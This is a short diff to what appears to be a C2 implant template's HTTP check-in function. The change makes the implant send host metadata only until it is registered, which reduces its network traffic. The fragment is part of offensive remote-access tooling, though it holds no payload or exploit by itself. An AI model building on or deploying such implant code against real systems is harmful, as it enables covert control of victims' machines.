@@ -32,6 +32,7 @@ Required Keys:
 #include "../protocols/http_wininet/http.h"
 #include "../modules/metadata.h"
 using namespace std::string_literals;
+#include "../control/settings.h"
 
 nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
@@ -40,7 +41,12 @@ nlohmann::json [[ http_get_function_name ]](std::string implant_uuid) {
     // Prep metadata as plaintext/unobsfucated
     std::map<std::string, std::string> metadata_map;
     metadata_map["implant_uuid"] = implant_uuid;
-    populate_metadata(metadata_map); //populate metadata with rest of metadata options
+
+    int registered = SettingsManager::instance().get<int>("registered",0);
+    if (registered == 0) {
+        //only send metadata if not registered, which keeps traffic size low. 
+        populate_metadata(metadata_map);
+    }
 
     //create the msgpack rep of metadata
     std::vector<uint8_t> metadata_as_msgpack;
